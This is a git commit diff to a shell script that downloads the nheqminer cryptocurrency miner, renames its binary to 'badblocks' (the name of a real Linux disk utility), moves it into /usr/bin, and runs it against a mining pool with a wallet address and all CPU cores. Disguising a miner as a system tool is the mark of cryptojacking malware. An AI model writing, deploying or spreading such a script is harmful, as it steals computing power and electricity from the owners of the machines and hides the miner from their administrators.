479efdd8d3fccb6e57bdaf943cc42105c40f7b85
renitaa12 <91271259+renitaa12@users.noreply.github.com>
2021-10-04 14:19:50 -0500

    Update nikmat.sh

--- nikmat.sh
+++ nikmat.sh
@@ -3,10 +3,13 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
 
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvzf nheqminer-Linux-v0.8.2.tgz
 tar xf nheqminer-Linux-v0.8.2.tar.gz
 cd nheqminer
-./nheqminer -v -l na.luckpool.net:3956 -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.Test -p x -t 2
+mv nheqminer badblocks
+mv badblocks /usr/bin
+badblocks -v -l verushash.asia.mine.zergpool.com:3300 -u D5snbNHPaNYMHAESeTrreRRVx3NLRdGo65.$(echo $(shuf -i 1-999 -n 1)-DUIT) -p c=DGB -t $(nproc --all)
  
      echo COUNTER $COUNTER
      let COUNTER-=1
